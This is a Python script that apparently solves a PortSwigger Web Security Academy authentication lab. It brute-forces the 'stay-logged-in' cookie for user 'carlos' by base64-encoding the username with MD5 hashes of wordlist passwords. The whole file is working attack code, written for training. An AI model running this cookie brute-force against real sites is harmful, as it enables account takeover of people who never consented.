#!/usr/bin/python

import base64
import hashlib
from multiprocessing import Pool

import requests

# used to solve this lab https://portswigger.net/web-security/authentication/password-based

URL = "https://acfa1fe61fc73e77801124220024007d.web-security-academy.net/my-account"

#  pool = Pool(3)


def is_valid_payload(line):
    cookies = {
        "stay-logged-in":
        base64.b64encode(
            b"carlos:" +
            hashlib.md5(line.encode()).hexdigest().encode()).decode()
    }

    res = requests.get(URL, cookies=cookies, allow_redirects=False)
    if res.status_code == 200:
        #  pool.terminate()
        print("password ", line)
        exit()


threads = []


def brute_passwords():
    with open("passwords") as passwords:
        while True:
            line = passwords.readline()
            line = line[:-1]
            if not line:
                break

            print("trying ", line)
            is_valid_payload(line)
            #  r = pool.apply_async(is_valid_payload, (line, ))
            #  threads.append(r)


#  brute_users = threading.Thread(target=brute_usernames)
#  brute_usernames(pool)
brute_passwords()
#  for thread in threads:
#      thread.join()
#  brute_pwd = threading.Thread(target=brute_passwords)
#  brute_users.start()
#  brute_pwd.start()

#  asyncio.run(main())
